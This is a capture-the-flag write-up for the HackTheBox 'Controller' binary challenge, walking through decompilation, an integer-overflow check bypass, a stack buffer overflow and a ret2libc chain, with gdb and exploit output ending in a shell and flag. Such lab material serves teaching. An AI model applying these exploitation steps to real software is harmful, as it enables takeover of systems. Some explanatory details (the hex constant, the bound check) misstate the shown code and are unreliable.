### Controller HackTheBox Apocalypse21

### Binary Exploitation

### Basic File Checks

```
└─$ file controller
controller: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e5746004163bf77994992a4c4e3c04565a7ad5d6, not stripped
                                                                                                                                                                 
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/controller]
└─$ checksec controller
[*] '/home/mark/Documents/Pentest/BOF/03-begineer_bof/controller/controller'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

We're working with a x64 binary which is dynamically linked and not stripped

Looking at the protections we see that it has just `FULL RELRO` making GOT overwrite impossible and `NX ENABLED` making ret2shellcode not possible

I'll run the binary to know what it does

```
└─$ ./controller           

👾 Control Room 👾

Insert the amount of 2 different types of recources: 1 1
Choose operation:

1. ➕

2. ➖

3. ❌

4. ➗

> 1
1 + 1 = 2
Insert the amount of 2 different types of recources: 2 10
Choose operation:

1. ➕

2. ➖

3. ❌

4. ➗

> 3
2 * 10 = 20
Insert the amount of 2 different types of recources: ^C
```

We see that its some sort of calculator 

Using ghidra i'll decompile the binary

Here's the decompiled main function

```

undefined8 main(void)

{
  setvbuf(stdout,(char *)0x0,2,0);
  welcome();
  calculator();
  return 0;
}
```

It calls welcome() function

Here's the decompiled welcome() function

```
void welcome(void)

{
  color(&controlroom,&red,&bold);
  return;
}
```

Nothing really much it just deals with the colour welcome banner

Main function also calls calculator()

```
void calculator(void)

{
  char input [28];
  int value;
  
  value = calc();
  if (value == 0xff3a) {
    printstr("Something odd happened!\nDo you want to report the problem?\n> ");
    __isoc99_scanf(%s,input);
    if ((input[0] == 'y') || (input[0] == 'Y')) {
      printstr("Problem reported!\n");
    }
    else {
      printstr("Problem ingored\n");
    }
  }
  else {
    calculator();
  }
  return;
}
```

So here's what this does

```
1. It calls the calc() function
2. It checks if the value the calc() function returns is equal to 0xff31 (-198)
3. IF the check is meet it receives our input using scanf and store in a buffer that can hold up to 28bytes
4. If the first index of our character is y or Y it prints problem reported
5. Else it prints problem ignored
6. Else the calculator function just keeps looping
```

Here's the decompiled code for calc()

```

uint calc(void)

{
  ushort uVar1;
  float fVar2;
  uint num2;
  uint num1;
  int menu;
  uint eval;
  
  printstr("Insert the amount of 2 different types of recources: ");
  __isoc99_scanf("%d %d",&num1,&num2);
  menu = ::menu();
  if ((0x45 < (int)num1) || (0x45 < (int)num2)) {
    printstr("We cannot use these many resources at once!\n");
                    /* WARNING: Subroutine does not return */
    exit(0x69);
  }
  if (menu == 2) {
    eval = sub(num1,num2);
    printf("%d - %d = %d\n",(ulong)num1,(ulong)num2,(ulong)eval);
    return eval;
  }
  if (menu < 3) {
    if (menu == 1) {
      eval = add(num1,num2);
      printf("%d + %d = %d\n",(ulong)num1,(ulong)num2,(ulong)eval);
      return eval;
    }
  }
  else {
    if (menu == 3) {
      uVar1 = mult(num1,num2);
      eval = (uint)uVar1;
      printf("%d * %d = %d\n",(ulong)num1,(ulong)num2,(ulong)eval);
      return eval;
    }
    if (menu == 4) {
      fVar2 = (float)divi(num1,num2);
      eval = (uint)(long)fVar2;
      printf("%d / %d = %d\n",(ulong)num1,(ulong)num2,(long)fVar2 & 0xffffffff);
      return eval;
    }
  }
  printstr("Invalid operation, exiting..\n");
  return eval;
}
```

Here's what the cde does

```
1. It asks for 2 numbers 
2. A check is done to know if any of the given number is less than 0x45 
3. Then it prints the options out
4. If the add function is chosen it basically just sums up the two numbers together same applies with other calculation options
5. If an integer is not given it will print invalid operation
```

From this we know that the aim is to firstly want to bypass the check that does a comparision of the value stored in check to -198

But before we do that we need to firstly make the calculation value to be equal to -198 

Since we are not given opportunity to input a large number we would have to find a way to get a number that when calculated gives -198

And the value i got is `-18 * 11 = -198`

With this we will bypass the if check then for the buffer overflow we know that scanf didn't specify the amount of bytes to write in 

Leveraging that will lead to a buffer overflow 

Now i'll run the binary to trigger segfault

```
└─$ ./controller           

👾 Control Room 👾

Insert the amount of 2 different types of recources: -18 11
Choose operation:

1. ➕

2. ➖

3. ❌

4. ➗

> 3
-18 * 11 = 65338
Something odd happened!
Do you want to report the problem?
> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaa                   
Problem ingored
zsh: segmentation fault  ./controller
```

With this we have confirmed the buffer overflow 

Now lets get the offset

```
└─$ gdb-gef -q controller 
Reading symbols from controller...
(No debugging symbols found in controller)
GEF for linux ready, type `gef' to start, `gef config' to configure
88 commands loaded and 5 functions added for GDB 12.1 in 0.01ms using Python engine 3.11
gef➤  r
Starting program: /home/mark/Documents/Pentest/BOF/03-begineer_bof/controller/controller 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

👾 Control Room 👾

Insert the amount of 2 different types of recources: -18 11
Choose operation:

1. ➕

2. ➖

3. ❌

4. ➗

> 3
-18 * 11 = 65338
Something odd happened!
Do you want to report the problem?
> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Problem ingored

Program received signal SIGSEGV, Segmentation fault.
0x00000000004010fd in calculator ()


[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x10              
$rbx   : 0x00007fffffffdef8  →  0x00007fffffffe256  →  "/home/mark/Documents/Pentest/BOF/03-begineer_bof/c[...]"
$rcx   : 0x00007ffff7e983b3  →  <clock_nanosleep+35> neg eax
$rdx   : 0x0000000000401400  →  "Problem ingored\n"
$rsp   : 0x00007fffffffddc8  →  "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"
$rbp   : 0x6161616a61616169 ("iaaajaaa"?)
$rsi   : 0x0               
$rdi   : 0x0000000000401400  →  "Problem ingored\n"
$rip   : 0x00000000004010fd  →  <calculator+151> ret 
$r8    : 0x00000000004013e7  →  0x7250005900790073 ("s"?)
$r9    : 0x00007ffff7f9ba80  →  0x00000000fbad2288
$r10   : 0x0               
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x00007fffffffdf08  →  0x00007fffffffe29d  →  0x5245545f5353454c ("LESS_TER"?)
$r14   : 0x0               
$r15   : 0x00007ffff7ffd020  →  0x00007ffff7ffe2e0  →  0x0000000000000000
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffddc8│+0x0000: "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"    ← $rsp
0x00007fffffffddd0│+0x0008: "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"
0x00007fffffffddd8│+0x0010: "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0x00007fffffffdde0│+0x0018: "qaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0x00007fffffffdde8│+0x0020: "saaataaauaaavaaawaaaxaaayaaa"
0x00007fffffffddf0│+0x0028: "uaaavaaawaaaxaaayaaa"
0x00007fffffffddf8│+0x0030: "waaaxaaayaaa"
0x00007fffffffde00│+0x0038: 0x0000000061616179 ("yaaa"?)
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4010f6 <calculator+144> call   0x401066 <calculator>
     0x4010fb <calculator+149> nop    
     0x4010fc <calculator+150> leave  
 →   0x4010fd <calculator+151> ret    
[!] Cannot disassemble from $PC
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "controller", stopped 0x4010fd in calculator (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4010fd → calculator()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤ 

└─$ cyclic -l kaaa
40
```

Cool the offset is 40. 

Now there's no win function to return to so what i can leverage here is ret2libc

What ret2libc does is this:

```
The general strategy to perform a libc leak is to call a function that will write output to the console, such as puts(). We will be leaking the contents of one of the entries of the Global Offset Table, or GOT; basically, the GOT is an area of the binary that contains entries for each libc function that link to addresses in the libc file, so dumping out the contents of the GOT will give us the libc address of a known function.

So, the basic chain we need to construct is to pop the address of a GOT entry into the rdi register, which will make it the first paramter of our call of the puts() function. Then we call puts to print our libc leak, and then we call main in order to get the opportunity to enter another ROP chain that uses the leak.
```

Here's the exploit code i'll be using [Exploit](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/htb/pwn/controller.py)

This is what it does:

```
1. It leaks the address of puts in libc
2. It calculates the libc base address
3. It gets the value of sh and system in libc which returns shell
```

Running it works

```
└─$ python3 exploit.py                         
[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './controller': pid 505734
[*] Puts leaked address 0x7ffff7e40820
[*] Libc address 0x7ffff7dc9000
[*] Libc system address 0x7ffff7e15330
[*] Libc /bin/sh address 0x7ffff7f5f031
[*] Switching to interactive mode
 -18 * 11 = 65338
Something odd happened!
Do you want to report the problem?
> Problem ingored
$ ls -al
total 32
drwxr-xr-x  2 mark mark  4096 Feb 18 17:11 .
drwxr-xr-x 29 mark mark  4096 Feb 18 15:25 ..
-rwxr-xr-x  1 mark mark 13096 Feb 18 15:25 controller
-rw-r--r--  1 mark mark  2286 Feb 18 17:07 exploit.py
-rw-r--r--  1 mark mark    43 Feb 18 15:43 flag.txt
$ cat flag.txt
CHTB{1nt3g3r_0v3rfl0w_s4v3d_0ur_r3s0urc3s}
$ 
```

And we're done

<br> <br>
[Back To Home](../../index.md)


  
